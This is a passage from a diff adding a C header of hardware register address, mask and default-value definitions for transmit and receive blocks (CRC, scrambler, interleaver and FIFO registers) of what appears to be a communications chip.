+#define ZT_UPROC7_STATE2_DEFAULT (0x0000)
+#define ZT_UPROC7_STATE2_FMASK (0xFFFFFFFF)
+#define ZT_UPROC7_STATE3       FCI_GLBTX_REG(0x01AC)
+#define ZT_UPROC7_STATE3_WMASK (0xFFFFFFFF)
+#define ZT_UPROC7_STATE3_MASK  (0xFFFFFFFF)
+#define ZT_UPROC7_STATE3_DEFAULT (0x0000)
+#define ZT_UPROC7_STATE3_FMASK (0xFFFFFFFF)
+#define ZT_UPROC7_STATE4       FCI_GLBTX_REG(0x01B0)
+#define ZT_UPROC7_STATE4_WMASK (0xFFFFFFFF)
+#define ZT_UPROC7_STATE4_MASK  (0xFFFFFFFF)
+#define ZT_UPROC7_STATE4_DEFAULT (0x0000)
+#define ZT_UPROC7_STATE4_FMASK (0xFFFFFFFF)
+#define ZT_UPROC8_STATE0       FCI_GLBTX_REG(0x01B4)
+#define ZT_UPROC8_STATE0_WMASK (0xFFFFFF00)
+#define ZT_UPROC8_STATE0_MASK  (0xFFFFFFFF)
+#define ZT_UPROC8_STATE0_DEFAULT (0x0000)
+#define ZT_UPROC8_STATE0_FMASK (0xFFFFFFFF)
+#define ZT_UPROC8_STATE1       FCI_GLBTX_REG(0x01B8)
+#define ZT_UPROC8_STATE1_WMASK (0xFFFFFFFF)
+#define ZT_UPROC8_STATE1_MASK  (0xFFFFFFFF)
+#define ZT_UPROC8_STATE1_DEFAULT (0x0000)
+#define ZT_UPROC8_STATE1_FMASK (0xFFFFFFFF)
+#define ZT_UPROC8_STATE2       FCI_GLBTX_REG(0x01BC)
+#define ZT_UPROC8_STATE2_WMASK (0xFFFFFFFF)
+#define ZT_UPROC8_STATE2_MASK  (0xFFFFFFFF)
+#define ZT_UPROC8_STATE2_DEFAULT (0x0000)
+#define ZT_UPROC8_STATE2_FMASK (0xFFFFFFFF)
+#define ZT_UPROC8_STATE3       FCI_GLBTX_REG(0x01C0)
+#define ZT_UPROC8_STATE3_WMASK (0xFFFFFFFF)
+#define ZT_UPROC8_STATE3_MASK  (0xFFFFFFFF)
+#define ZT_UPROC8_STATE3_DEFAULT (0x0000)
+#define ZT_UPROC8_STATE3_FMASK (0xFFFFFFFF)
+#define ZT_UPROC8_STATE4       FCI_GLBTX_REG(0x01C4)
+#define ZT_UPROC8_STATE4_WMASK (0xFFFFFFFF)
+#define ZT_UPROC8_STATE4_MASK  (0xFFFFFFFF)
+#define ZT_UPROC8_STATE4_DEFAULT (0x0000)
+#define ZT_UPROC8_STATE4_FMASK (0xFFFFFFFF)
+#define ZT_UPROC9_STATE0       FCI_GLBTX_REG(0x01C8)
+#define ZT_UPROC9_STATE0_WMASK (0xFFFFFF00)
+#define ZT_UPROC9_STATE0_MASK  (0xFFFFFFFF)
+#define ZT_UPROC9_STATE0_DEFAULT (0x0000)
+#define ZT_UPROC9_STATE0_FMASK (0xFFFFFFFF)
+#define ZT_UPROC9_STATE1       FCI_GLBTX_REG(0x01CC)
+#define ZT_UPROC9_STATE1_WMASK (0xFFFFFFFF)
+#define ZT_UPROC9_STATE1_MASK  (0xFFFFFFFF)
+#define ZT_UPROC9_STATE1_DEFAULT (0x0000)
+#define ZT_UPROC9_STATE1_FMASK (0xFFFFFFFF)
+#define ZT_UPROC9_STATE2       FCI_GLBTX_REG(0x01D0)
+#define ZT_UPROC9_STATE2_WMASK (0xFFFFFFFF)
+#define ZT_UPROC9_STATE2_MASK  (0xFFFFFFFF)
+#define ZT_UPROC9_STATE2_DEFAULT (0x0000)
+#define ZT_UPROC9_STATE2_FMASK (0xFFFFFFFF)
+#define ZT_UPROC9_STATE3       FCI_GLBTX_REG(0x01D4)
+#define ZT_UPROC9_STATE3_WMASK (0xFFFFFFFF)
+#define ZT_UPROC9_STATE3_MASK  (0xFFFFFFFF)
+#define ZT_UPROC9_STATE3_DEFAULT (0x0000)
+#define ZT_UPROC9_STATE3_FMASK (0xFFFFFFFF)
+#define ZT_UPROC9_STATE4       FCI_GLBTX_REG(0x01D8)
+#define ZT_UPROC9_STATE4_WMASK (0xFFFFFFFF)
+#define ZT_UPROC9_STATE4_MASK  (0xFFFFFFFF)
+#define ZT_UPROC9_STATE4_DEFAULT (0x0000)
+#define ZT_UPROC9_STATE4_FMASK (0xFFFFFFFF)
+#define ZT_UPROC_STATE5        FCI_GLBTX_REG(0x01DC)
+#define ZT_UPROC_STATE5_WMASK  (0xFFFFF)
+#define ZT_UPROC_STATE5_MASK   (0xFFFFF)
+#define ZT_UPROC_STATE5_DEFAULT (0x0000)
+#define ZT_UPROC_STATE5_FMASK  (0xFFFFF)
+#define ZT_ALU_STATE           FCI_GLBTX_REG(0x01E0)
+#define ZT_ALU_STATE_WMASK     (0x3FFFFFFF)
+#define ZT_ALU_STATE_MASK      (0x3FFFFFFF)
+#define ZT_ALU_STATE_DEFAULT   (0x0000)
+#define ZT_ALU_STATE_FMASK     (0x3FFFFFFF)
+#define ZT_ALU_CLI_REQ         FCI_GLBTX_REG(0x01E4)
+#define ZT_ALU_CLI_REQ_WMASK   (0x03FF)
+#define ZT_ALU_CLI_REQ_MASK    (0x03FF)
+#define ZT_ALU_CLI_REQ_DEFAULT (0x0000)
+#define ZT_ALU_CLI_REQ_FMASK   (0x03FF)
+#define Z_VERSION              FCI_GLBTX_REG(0x01E8)
+#define Z_VERSION_WMASK        (0x0000)
+#define Z_VERSION_MASK         (0x00FF)
+#define Z_VERSION_DEFAULT      (0x0050)
+#define Z_VERSION_FMASK        (0x00FF)
+#define Z_MBOX_ACCESS          FCI_GLBTX_REG(0x01EC)
+#define Z_MBOX_ACCESS_WMASK    (0x0001)
+#define Z_MBOX_ACCESS_MASK     (0x0001)
+#define Z_MBOX_ACCESS_DEFAULT  (0x0000)
+#define Z_MBOX_ACCESS_FMASK    (0x0001)
+#define ZT_FIFO_ACCESS         FCI_GLBTX_REG(0x01F0)
+#define ZT_FIFO_ACCESS_WMASK   (0xBFFFF7FF)
+#define ZT_FIFO_ACCESS_MASK    (0xBFFFFFFF)
+#define ZT_FIFO_ACCESS_DEFAULT (0x0800)
+#define ZT_FIFO_ACCESS_FMASK   (0xBFFFFFFF)
+#define ZT_CONFIG              FCI_GLBTX_REG(0x01F4)
+#define ZT_CONFIG_WMASK        (0xFFFF)
+#define ZT_CONFIG_MASK         (0xFFFF)
+#define ZT_CONFIG_DEFAULT      (0x0000)
+#define ZT_CONFIG_FMASK        (0xFFFF)
+#define ZT_PMS_SIZE            FCI_GLBTX_REG(0x01F8)
+#define ZT_PMS_SIZE_WMASK      (0xFFFFFFFF)
+#define ZT_PMS_SIZE_MASK       (0xFFFFFFFF)
+#define ZT_PMS_SIZE_DEFAULT    (0x0000)
+#define ZT_PMS_SIZE_FMASK      (0xFFFFFFFF)
+#define ZT_DT_SIZE             FCI_GLBTX_REG(0x01FC)
+#define ZT_DT_SIZE_WMASK       (0xFFFFFFFF)
+#define ZT_DT_SIZE_MASK        (0xFFFFFFFF)
+#define ZT_DT_SIZE_DEFAULT     (0x0000)
+#define ZT_DT_SIZE_FMASK       (0xFFFFFFFF)
+#define ZT_QTDTB_CONFIG_LP0    FCI_GLBTX_REG(0x0200)
+#define ZT_QTDTB_CONFIG_LP0_WMASK (0xCFFF0FFF)
+#define ZT_QTDTB_CONFIG_LP0_MASK (0xCFFF0FFF)
+#define ZT_QTDTB_CONFIG_LP0_DEFAULT (0x0000)
+#define ZT_QTDTB_CONFIG_LP0_FMASK (0xCFFF0FFF)
+#define ZT_QTDTB_CONFIG_LP1    FCI_GLBTX_REG(0x0204)
+#define ZT_QTDTB_CONFIG_LP1_WMASK (0xCFFF0FFF)
+#define ZT_QTDTB_CONFIG_LP1_MASK (0xCFFF0FFF)
+#define ZT_QTDTB_CONFIG_LP1_DEFAULT (0x0000)
+#define ZT_QTDTB_CONFIG_LP1_FMASK (0xCFFF0FFF)
+#define ZT_QTDTB_CONFIG_LP2    FCI_GLBTX_REG(0x0208)
+#define ZT_QTDTB_CONFIG_LP2_WMASK (0xFFF0FFF)
+#define ZT_QTDTB_CONFIG_LP2_MASK (0xFFF0FFF)
+#define ZT_QTDTB_CONFIG_LP2_DEFAULT (0x0000)
+#define ZT_QTDTB_CONFIG_LP2_FMASK (0xFFF0FFF)
+#define ZT_QTDTB_ADDR_LP01     FCI_GLBTX_REG(0x020C)
+#define ZT_QTDTB_ADDR_LP01_WMASK (0xFFF0FFF)
+#define ZT_QTDTB_ADDR_LP01_MASK (0xFFF0FFF)
+#define ZT_QTDTB_ADDR_LP01_DEFAULT (0x0000)
+#define ZT_QTDTB_ADDR_LP01_FMASK (0xFFF0FFF)
+#define ZT_QTDTB_ADDR_LP2      FCI_GLBTX_REG(0x0210)
+#define ZT_QTDTB_ADDR_LP2_WMASK (0x0FFF)
+#define ZT_QTDTB_ADDR_LP2_MASK (0x0FFF)
+#define ZT_QTDTB_ADDR_LP2_DEFAULT (0x0000)
+#define ZT_QTDTB_ADDR_LP2_FMASK (0x0FFF)
+#define ZT_DTB_OFFSET          FCI_GLBTX_REG(0x0214)
+#define ZT_DTB_OFFSET_WMASK    (0x0FFF)
+#define ZT_DTB_OFFSET_MASK     (0x0FFF)
+#define ZT_DTB_OFFSET_DEFAULT  (0x0000)
+#define ZT_DTB_OFFSET_FMASK    (0x0FFF)
+#define ZT_STAT_CTRL           FCI_GLBTX_REG(0x0218)
+#define ZT_STAT_CTRL_WMASK     (0x0101)
+#define ZT_STAT_CTRL_MASK      (0x0101)
+#define ZT_STAT_CTRL_DEFAULT   (0x0000)
+#define ZT_STAT_CTRL_FMASK     (0x0100)
+#define ZT_ALU_CLI_REQ_ALIAS0  FCI_GLBTX_REG(0x021C)
+#define ZT_ALU_CLI_REQ_ALIAS0_WMASK (0x0000)
+#define ZT_ALU_CLI_REQ_ALIAS0_MASK (0x1010101)
+#define ZT_ALU_CLI_REQ_ALIAS0_DEFAULT (0x0000)
+#define ZT_ALU_CLI_REQ_ALIAS0_FMASK (0x0000)
+#define ZT_ALU_CLI_REQ_ALIAS1  FCI_GLBTX_REG(0x0220)
+#define ZT_ALU_CLI_REQ_ALIAS1_WMASK (0x0000)
+#define ZT_ALU_CLI_REQ_ALIAS1_MASK (0x1010101)
+#define ZT_ALU_CLI_REQ_ALIAS1_DEFAULT (0x0000)
+#define ZT_ALU_CLI_REQ_ALIAS1_FMASK (0x0000)
+#define ZT_ALU_CLI_REQ_ALIAS2  FCI_GLBTX_REG(0x0224)
+#define ZT_ALU_CLI_REQ_ALIAS2_WMASK (0x0000)
+#define ZT_ALU_CLI_REQ_ALIAS2_MASK (0x0101)
+#define ZT_ALU_CLI_REQ_ALIAS2_DEFAULT (0x0000)
+#define ZT_ALU_CLI_REQ_ALIAS2_FMASK (0x0000)
+#define Z_PRAM_STATUS          FCI_GLBTX_REG(0x0228)
+#define Z_PRAM_STATUS_WMASK    (0x0000)
+#define Z_PRAM_STATUS_MASK     (0x0003)
+#define Z_PRAM_STATUS_DEFAULT  (0x0000)
+#define Z_PRAM_STATUS_FMASK    (0x0003)
+
+/* Fci Glbrx Address Constants */ 
+#define fci_glbrx_reg_base     (0x20DC00)
+#define FCI_GLBRX_REG(r)       (int)(fci_glbrx_reg_base + (r))
+#define fci_glbrx_reg_size     (0x0001)
+
+#define ZR_R0                  FCI_GLBRX_REG(0x0000)
+#define ZR_R0_WMASK            (0xFFFFFFFF)
+#define ZR_R0_MASK             (0xFFFFFFFF)
+#define ZR_R0_DEFAULT          (0x0000)
+#define ZR_R0_FMASK            (0xFFFFFFFF)
+#define ZR_R4                  FCI_GLBRX_REG(0x0004)
+#define ZR_R4_WMASK            (0xFFFFFFFF)
+#define ZR_R4_MASK             (0xFFFFFFFF)
+#define ZR_R4_DEFAULT          (0x0000)
+#define ZR_R4_FMASK            (0xFFFFFFFF)
+#define ZR_R8                  FCI_GLBRX_REG(0x0008)
+#define ZR_R8_WMASK            (0xFFFFFFFF)
+#define ZR_R8_MASK             (0xFFFFFFFF)
+#define ZR_R8_DEFAULT          (0x0000)
+#define ZR_R8_FMASK            (0xFFFFFFFF)
+#define ZR_R12                 FCI_GLBRX_REG(0x000C)
+#define ZR_R12_WMASK           (0xFFFFFFFF)
+#define ZR_R12_MASK            (0xFFFFFFFF)
+#define ZR_R12_DEFAULT         (0x0000)
+#define ZR_R12_FMASK           (0xFFFFFFFF)
+#define ZR_CODEWORD            FCI_GLBRX_REG(0x0010)
+#define ZR_CODEWORD_WMASK      (0xFFFFFFFF)
+#define ZR_CODEWORD_MASK       (0xFFFFFFFF)
+#define ZR_CODEWORD_DEFAULT    (0x0000)
+#define ZR_CODEWORD_FMASK      (0xFFFFFFFF)
+#define ZR_VBC_SIZE            FCI_GLBRX_REG(0x0014)
+#define ZR_VBC_SIZE_WMASK      (0xFFFFFFFF)
+#define ZR_VBC_SIZE_MASK       (0xFFFFFFFF)
+#define ZR_VBC_SIZE_DEFAULT    (0x0000)
+#define ZR_VBC_SIZE_FMASK      (0xFFFFFFFF)
+#define ZR_FRAMING             FCI_GLBRX_REG(0x0018)
+#define ZR_FRAMING_WMASK       (0xFFFFFFFF)
+#define ZR_FRAMING_MASK        (0xFFFFFFFF)
+#define ZR_FRAMING_DEFAULT     (0x0000)
+#define ZR_FRAMING_FMASK       (0xFFFFFFFF)
+#define ZR_OHRATE              FCI_GLBRX_REG(0x001C)
+#define ZR_OHRATE_WMASK        (0xFFFFFFFF)
+#define ZR_OHRATE_MASK         (0xFFFFFFFF)
+#define ZR_OHRATE_DEFAULT      (0x0000)
+#define ZR_OHRATE_FMASK        (0xFFFFFFFF)
+#define ZR_FLAG_CTRL0          FCI_GLBRX_REG(0x0020)
+#define ZR_FLAG_CTRL0_WMASK    (0x77777777)
+#define ZR_FLAG_CTRL0_MASK     (0x77777777)
+#define ZR_FLAG_CTRL0_DEFAULT  (0x0000)
+#define ZR_FLAG_CTRL0_FMASK    (0x77777777)
+#define ZR_FLAG_CTRL1          FCI_GLBRX_REG(0x0024)
+#define ZR_FLAG_CTRL1_WMASK    (0x7777777)
+#define ZR_FLAG_CTRL1_MASK     (0x7777777)
+#define ZR_FLAG_CTRL1_DEFAULT  (0x0000)
+#define ZR_FLAG_CTRL1_FMASK    (0x7777777)
+#define ZR_CRC0                FCI_GLBRX_REG(0x0028)
+#define ZR_CRC0_WMASK          (0xFFFFFFFF)
+#define ZR_CRC0_MASK           (0xFFFFFFFF)
+#define ZR_CRC0_DEFAULT        (0x0000)
+#define ZR_CRC0_FMASK          (0xFFFFFFFF)
+#define ZR_CRC_POLY0           FCI_GLBRX_REG(0x002C)
+#define ZR_CRC_POLY0_WMASK     (0xFFFFFFFF)
+#define ZR_CRC_POLY0_MASK      (0xFFFFFFFF)
+#define ZR_CRC_POLY0_DEFAULT   (0x0000)
+#define ZR_CRC_POLY0_FMASK     (0xFFFFFFFF)
+#define ZR_CRC_CTRL0           FCI_GLBRX_REG(0x0030)
+#define ZR_CRC_CTRL0_WMASK     (0xFFFF0103)
+#define ZR_CRC_CTRL0_MASK      (0xFFFF0103)
+#define ZR_CRC_CTRL0_DEFAULT   (0x0000)
+#define ZR_CRC_CTRL0_FMASK     (0xFFFF0103)
+#define ZR_CRC1                FCI_GLBRX_REG(0x0034)
+#define ZR_CRC1_WMASK          (0xFFFFFFFF)
+#define ZR_CRC1_MASK           (0xFFFFFFFF)
+#define ZR_CRC1_DEFAULT        (0x0000)
+#define ZR_CRC1_FMASK          (0xFFFFFFFF)
+#define ZR_CRC_POLY1           FCI_GLBRX_REG(0x0038)
+#define ZR_CRC_POLY1_WMASK     (0xFFFFFFFF)
+#define ZR_CRC_POLY1_MASK      (0xFFFFFFFF)
+#define ZR_CRC_POLY1_DEFAULT   (0x0000)
+#define ZR_CRC_POLY1_FMASK     (0xFFFFFFFF)
+#define ZR_CRC_CTRL1           FCI_GLBRX_REG(0x003C)
+#define ZR_CRC_CTRL1_WMASK     (0xFFFF0103)
+#define ZR_CRC_CTRL1_MASK      (0xFFFF0103)
+#define ZR_CRC_CTRL1_DEFAULT   (0x0000)
+#define ZR_CRC_CTRL1_FMASK     (0xFFFF0103)
+#define ZR_SCR                 FCI_GLBRX_REG(0x0040)
+#define ZR_SCR_WMASK           (0xFFFFFFFF)
+#define ZR_SCR_MASK            (0xFFFFFFFF)
+#define ZR_SCR_DEFAULT         (0x0000)
+#define ZR_SCR_FMASK           (0xFFFFFFFF)
+#define ZR_SCR_POLY            FCI_GLBRX_REG(0x0044)
+#define ZR_SCR_POLY_WMASK      (0xFFFFFFFF)
+#define ZR_SCR_POLY_MASK       (0xFFFFFFFF)
+#define ZR_SCR_POLY_DEFAULT    (0x0000)
+#define ZR_SCR_POLY_FMASK      (0xFFFFFFFF)
+#define ZR_SCR_CTRL            FCI_GLBRX_REG(0x0048)
+#define ZR_SCR_CTRL_WMASK      (0x001F)
+#define ZR_SCR_CTRL_MASK       (0x001F)
+#define ZR_SCR_CTRL_DEFAULT    (0x0000)
+#define ZR_SCR_CTRL_FMASK      (0x001F)
+#define ZR_SCR_STATE           FCI_GLBRX_REG(0x004C)
+#define ZR_SCR_STATE_WMASK     (0x3FFFFFF)
+#define ZR_SCR_STATE_MASK      (0x3FFFFFF)
+#define ZR_SCR_STATE_DEFAULT   (0x0000)
+#define ZR_SCR_STATE_FMASK     (0x3FFFFFF)
+#define ZR_DTB_CTRL            FCI_GLBRX_REG(0x0050)
+#define ZR_DTB_CTRL_WMASK      (0x1FFF0FFF)
+#define ZR_DTB_CTRL_MASK       (0x1FFF0FFF)
+#define ZR_DTB_CTRL_DEFAULT    (0x0000)
+#define ZR_DTB_CTRL_FMASK      (0x1FFF0FFF)
+#define ZR_DTB_PTRS            FCI_GLBRX_REG(0x0054)
+#define ZR_DTB_PTRS_WMASK      (0xFFFFFFFF)
+#define ZR_DTB_PTRS_MASK       (0xFFFFFFFF)
+#define ZR_DTB_PTRS_DEFAULT    (0x0000)
+#define ZR_DTB_PTRS_FMASK      (0xFFFFFFFF)
+#define ZR_ILVB_WRAD           FCI_GLBRX_REG(0x0058)
+#define ZR_ILVB_WRAD_WMASK     (0xFFFFFFFF)
+#define ZR_ILVB_WRAD_MASK      (0xFFFFFFFF)
+#define ZR_ILVB_WRAD_DEFAULT   (0x0000)
+#define ZR_ILVB_WRAD_FMASK     (0xFFFFFFFF)
+#define ZR_ILVB_RDAD           FCI_GLBRX_REG(0x005C)
+#define ZR_ILVB_RDAD_WMASK     (0xFFFFFFFF)
+#define ZR_ILVB_RDAD_MASK      (0xFFFFFFFF)
+#define ZR_ILVB_RDAD_DEFAULT   (0x0000)
+#define ZR_ILVB_RDAD_FMASK     (0xFFFFFFFF)
+#define ZR_ILVB_WRPTR          FCI_GLBRX_REG(0x0060)
+#define ZR_ILVB_WRPTR_WMASK    (0xFFFFFFFF)
+#define ZR_ILVB_WRPTR_MASK     (0xFFFFFFFF)
+#define ZR_ILVB_WRPTR_DEFAULT  (0x0000)
+#define ZR_ILVB_WRPTR_FMASK    (0xFFFFFFFF)
+#define ZR_ILVB_RDPTR          FCI_GLBRX_REG(0x0064)
+#define ZR_ILVB_RDPTR_WMASK    (0xFFFFFFFF)
+#define ZR_ILVB_RDPTR_MASK     (0xFFFFFFFF)
+#define ZR_ILVB_RDPTR_DEFAULT  (0x0000)
+#define ZR_ILVB_RDPTR_FMASK    (0xFFFFFFFF)
+#define ZR_FIFO_BASE0          FCI_GLBRX_REG(0x0068)
+#define ZR_FIFO_BASE0_WMASK    (0x3FFFFFF)
+#define ZR_FIFO_BASE0_MASK     (0x3FFFFFF)
+#define ZR_FIFO_BASE0_DEFAULT  (0x0000)
+#define ZR_FIFO_BASE0_FMASK    (0x3FFFFFF)
+#define ZR_FIFO_PTRS0          FCI_GLBRX_REG(0x006C)
+#define ZR_FIFO_PTRS0_WMASK    (0xC0FF00FF)
+#define ZR_FIFO_PTRS0_MASK     (0xC0FF00FF)
+#define ZR_FIFO_PTRS0_DEFAULT  (0x0000)
+#define ZR_FIFO_PTRS0_FMASK    (0xC0FF00FF)
+#define ZR_FIFO_CNST0          FCI_GLBRX_REG(0x0070)
+#define ZR_FIFO_CNST0_WMASK    (0xFFFFFF)
+#define ZR_FIFO_CNST0_MASK     (0xFFFFFF)
+#define ZR_FIFO_CNST0_DEFAULT  (0x0000)
+#define ZR_FIFO_CNST0_FMASK    (0xFFFFFF)
+#define ZR_FIFO_BASE1          FCI_GLBRX_REG(0x0074)
+#define ZR_FIFO_BASE1_WMASK    (0x3FFFFFF)
+#define ZR_FIFO_BASE1_MASK     (0x3FFFFFF)
+#define ZR_FIFO_BASE1_DEFAULT  (0x0000)
+#define ZR_FIFO_BASE1_FMASK    (0x3FFFFFF)
+#define ZR_FIFO_PTRS1          FCI_GLBRX_REG(0x0078)
+#define ZR_FIFO_PTRS1_WMASK    (0xC0FF00FF)
+#define ZR_FIFO_PTRS1_MASK     (0xC0FF00FF)
+#define ZR_FIFO_PTRS1_DEFAULT  (0x0000)
+#define ZR_FIFO_PTRS1_FMASK    (0xC0FF00FF)
+#define ZR_FIFO_CNST1          FCI_GLBRX_REG(0x007C)
+#define ZR_FIFO_CNST1_WMASK    (0xFFFFFF)
+#define ZR_FIFO_CNST1_MASK     (0xFFFFFF)
+#define ZR_FIFO_CNST1_DEFAULT  (0x0000)
+#define ZR_FIFO_CNST1_FMASK    (0xFFFFFF)
+#define ZR_FIFO_BASE2          FCI_GLBRX_REG(0x0080)
+#define ZR_FIFO_BASE2_WMASK    (0x3FFFFFF)
+#define ZR_FIFO_BASE2_MASK     (0x3FFFFFF)
+#define ZR_FIFO_BASE2_DEFAULT  (0x0000)
+#define ZR_FIFO_BASE2_FMASK    (0x3FFFFFF)
+#define ZR_FIFO_PTRS2          FCI_GLBRX_REG(0x0084)
+#define ZR_FIFO_PTRS2_WMASK    (0xC0FF00FF)
+#define ZR_FIFO_PTRS2_MASK     (0xC0FF00FF)
+#define ZR_FIFO_PTRS2_DEFAULT  (0x0000)
+#define ZR_FIFO_PTRS2_FMASK    (0xC0FF00FF)
+#define ZR_FIFO_CNST2          FCI_GLBRX_REG(0x0088)
+#define ZR_FIFO_CNST2_WMASK    (0xFFFFFF)
+#define ZR_FIFO_CNST2_MASK     (0xFFFFFF)
+#define ZR_FIFO_CNST2_DEFAULT  (0x0000)
+#define ZR_FIFO_CNST2_FMASK    (0xFFFFFF)
+#define ZR_FIFO_BASE3          FCI_GLBRX_REG(0x008C)
+#define ZR_FIFO_BASE3_WMASK    (0x3FFFFFFF)
+#define ZR_FIFO_BASE3_MASK     (0x3FFFFFFF)
+#define ZR_FIFO_BASE3_DEFAULT  (0x0000)
+#define ZR_FIFO_BASE3_FMASK    (0x3FFFFFFF)
+#define ZR_FIFO_PTRS3          FCI_GLBRX_REG(0x0090)
+#define ZR_FIFO_PTRS3_WMASK    (0xCFFF0FFF)
+#define ZR_FIFO_PTRS3_MASK     (0xCFFF0FFF)
+#define ZR_FIFO_PTRS3_DEFAULT  (0x0000)
+#define ZR_FIFO_PTRS3_FMASK    (0xCFFF0FFF)
+#define ZR_FIFO_CNST3          FCI_GLBRX_REG(0x0094)
+#define ZR_FIFO_CNST3_WMASK    (0x1FFFFFF)
+#define ZR_FIFO_CNST3_MASK     (0x1FFFFFF)
+#define ZR_FIFO_CNST3_DEFAULT  (0x0000)
+#define ZR_FIFO_CNST3_FMASK    (0x1FFFFFF)
+#define ZR_DEPTH               FCI_GLBRX_REG(0x0098)
+#define ZR_DEPTH_WMASK         (0xFFFFFFFF)
+#define ZR_DEPTH_MASK          (0xFFFFFFFF)
+#define ZR_DEPTH_DEFAULT       (0x0000)
+#define ZR_DEPTH_FMASK         (0xFFFFFFFF)
+#define ZR_ILV_PARAMS0         FCI_GLBRX_REG(0x009C)
+#define ZR_ILV_PARAMS0_WMASK   (0xFFFFFF07)
+#define ZR_ILV_PARAMS0_MASK    (0xFFFFFF17)
+#define ZR_ILV_PARAMS0_DEFAULT (0x0000)
+#define ZR_ILV_PARAMS0_FMASK   (0xFFFFFF07)
+#define ZR_ILV_BASE0           FCI_GLBRX_REG(0x00A0)
+#define ZR_ILV_BASE0_WMASK     (0x3FFFF)
+#define ZR_ILV_BASE0_MASK      (0x3FFFF)
+#define ZR_ILV_BASE0_DEFAULT   (0x0000)
+#define ZR_ILV_BASE0_FMASK     (0x3FFFF)
+#define ZR_ILV_SIZE0           FCI_GLBRX_REG(0x00A4)
+#define ZR_ILV_SIZE0_WMASK     (0xFFFFFF)
+#define ZR_ILV_SIZE0_MASK      (0xFFFFFF)
+#define ZR_ILV_SIZE0_DEFAULT   (0x0000)
+#define ZR_ILV_SIZE0_FMASK     (0xFFFFFF)
+#define ZR_ILV_MAX_FULLNESS0   FCI_GLBRX_REG(0x00A8)
+#define ZR_ILV_MAX_FULLNESS0_WMASK (0x3FFFF)
+#define ZR_ILV_MAX_FULLNESS0_MASK (0x3FFFF)
+#define ZR_ILV_MAX_FULLNESS0_DEFAULT (0x0000)
+#define ZR_ILV_MAX_FULLNESS0_FMASK (0x3FFFF)
+#define ZR_ILV_MIN_FULLNESS0   FCI_GLBRX_REG(0x00AC)
+#define ZR_ILV_MIN_FULLNESS0_WMASK (0x3FFFF)
+#define ZR_ILV_MIN_FULLNESS0_MASK (0x3FFFF)
+#define ZR_ILV_MIN_FULLNESS0_DEFAULT (0x0000)
+#define ZR_ILV_MIN_FULLNESS0_FMASK (0x3FFFF)
+#define ZR_ILV_FULLNESS0       FCI_GLBRX_REG(0x00B0)
+#define ZR_ILV_FULLNESS0_WMASK (0x3FFFF)
+#define ZR_ILV_FULLNESS0_MASK  (0x3FFFF)
+#define ZR_ILV_FULLNESS0_DEFAULT (0x0000)
+#define ZR_ILV_FULLNESS0_FMASK (0x3FFFF)
+#define ZR_ILV_CNTRS0          FCI_GLBRX_REG(0x00B4)
+#define ZR_ILV_CNTRS0_WMASK    (0xFFFF0000)
+#define ZR_ILV_CNTRS0_MASK     (0xFFFF0000)
+#define ZR_ILV_CNTRS0_DEFAULT  (0x0000)
+#define ZR_ILV_CNTRS0_FMASK    (0xFFFF0000)
+#define ZR_ILV_PMS_CNTRS0      FCI_GLBRX_REG(0x00B8)
+#define ZR_ILV_PMS_CNTRS0_WMASK (0xFFFFFFFF)
+#define ZR_ILV_PMS_CNTRS0_MASK (0xFFFFFFFF)
+#define ZR_ILV_PMS_CNTRS0_DEFAULT (0x0000)
+#define ZR_ILV_PMS_CNTRS0_FMASK (0xFFFFFFFF)
+#define ZR_ILV_PMD_CNTRS0      FCI_GLBRX_REG(0x00BC)
+#define ZR_ILV_PMD_CNTRS0_WMASK (0xFFFFFFFF)
+#define ZR_ILV_PMD_CNTRS0_MASK (0xFFFFFFFF)
+#define ZR_ILV_PMD_CNTRS0_DEFAULT (0x0000)
+#define ZR_ILV_PMD_CNTRS0_FMASK (0xFFFFFFFF)
+#define ZR_ILV_PARAMS1         FCI_GLBRX_REG(0x00C0)
+#define ZR_ILV_PARAMS1_WMASK   (0xFFFFFF07)
+#define ZR_ILV_PARAMS1_MASK    (0xFFFFFF17)
+#define ZR_ILV_PARAMS1_DEFAULT (0x0000)
+#define ZR_ILV_PARAMS1_FMASK   (0xFFFFFF07)
+#define ZR_ILV_BASE1           FCI_GLBRX_REG(0x00C4)
+#define ZR_ILV_BASE1_WMASK     (0x3FFFF)
+#define ZR_ILV_BASE1_MASK      (0x3FFFF)
+#define ZR_ILV_BASE1_DEFAULT   (0x0000)
+#define ZR_ILV_BASE1_FMASK     (0x3FFFF)
+#define ZR_ILV_SIZE1           FCI_GLBRX_REG(0x00C8)
+#define ZR_ILV_SIZE1_WMASK     (0xFFFFFF)
+#define ZR_ILV_SIZE1_MASK      (0xFFFFFF)
+#define ZR_ILV_SIZE1_DEFAULT   (0x0000)
+#define ZR_ILV_SIZE1_FMASK     (0xFFFFFF)
+#define ZR_ILV_MAX_FULLNESS1   FCI_GLBRX_REG(0x00CC)
+#define ZR_ILV_MAX_FULLNESS1_WMASK (0x3FFFF)
+#define ZR_ILV_MAX_FULLNESS1_MASK (0x3FFFF)
+#define ZR_ILV_MAX_FULLNESS1_DEFAULT (0x0000)
+#define ZR_ILV_MAX_FULLNESS1_FMASK (0x3FFFF)
+#define ZR_ILV_MIN_FULLNESS1   FCI_GLBRX_REG(0x00D0)
+#define ZR_ILV_MIN_FULLNESS1_WMASK (0x3FFFF)
+#define ZR_ILV_MIN_FULLNESS1_MASK (0x3FFFF)
+#define ZR_ILV_MIN_FULLNESS1_DEFAULT (0x0000)
+#define ZR_ILV_MIN_FULLNESS1_FMASK (0x3FFFF)
+#define ZR_ILV_FULLNESS1       FCI_GLBRX_REG(0x00D4)
+#define ZR_ILV_FULLNESS1_WMASK (0x3FFFF)
+#define ZR_ILV_FULLNESS1_MASK  (0x3FFFF)
+#define ZR_ILV_FULLNESS1_DEFAULT (0x0000)
+#define ZR_ILV_FULLNESS1_FMASK (0x3FFFF)
+#define ZR_ILV_CNTRS1          FCI_GLBRX_REG(0x00D8)
+#define ZR_ILV_CNTRS1_WMASK    (0xFFFF0000)
+#define ZR_ILV_CNTRS1_MASK     (0xFFFF0000)
+#define ZR_ILV_CNTRS1_DEFAULT  (0x0000)
+#define ZR_ILV_CNTRS1_FMASK    (0xFFFF0000)
+#define ZR_ILV_PMS_CNTRS1      FCI_GLBRX_REG(0x00DC)
+#define ZR_ILV_PMS_CNTRS1_WMASK (0xFFFFFFFF)
+#define ZR_ILV_PMS_CNTRS1_MASK (0xFFFFFFFF)
+#define ZR_ILV_PMS_CNTRS1_DEFAULT (0x0000)
+#define ZR_ILV_PMS_CNTRS1_FMASK (0xFFFFFFFF)
+#define ZR_ILV_PMD_CNTRS1      FCI_GLBRX_REG(0x00E0)
